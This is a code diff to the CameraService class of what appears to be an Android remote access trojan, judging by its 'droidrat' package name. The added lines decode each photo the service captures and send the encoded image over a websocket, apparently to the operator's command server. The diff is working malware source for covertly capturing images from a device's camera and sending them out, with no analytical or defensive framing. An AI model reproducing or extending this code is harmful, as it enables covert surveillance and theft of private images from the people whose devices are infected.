@@ -5,6 +5,8 @@ import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
@@ -24,11 +26,15 @@ import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
 import androidx.core.app.ActivityCompat;
 
+import com.je_chen.droidrat_je.util.ImageUtil;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.util.Collections;
+
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;
 
 public class CameraService extends Service {
 
@@ -191,6 +197,7 @@ public class CameraService extends Service {
         ByteBuffer buffer;
         byte[] bytes;
         File file = new File(Environment.getExternalStorageDirectory() + "/Pictures/image.jpg");
+
         FileOutputStream output = null;
 
         if (image.getFormat() == ImageFormat.JPEG) {
@@ -204,6 +211,9 @@ public class CameraService extends Service {
                 e.printStackTrace();
             } finally {
                 image.close(); // close this to free up buffer for other images
+                Bitmap bitmap = BitmapFactory.decodeFile(file.getPath());
+                if (bitmap != null)
+                    websocket.send(ImageUtil.convert(bitmap) + "\n\n");
                 if (null != output) {
                     try {
                         output.close();
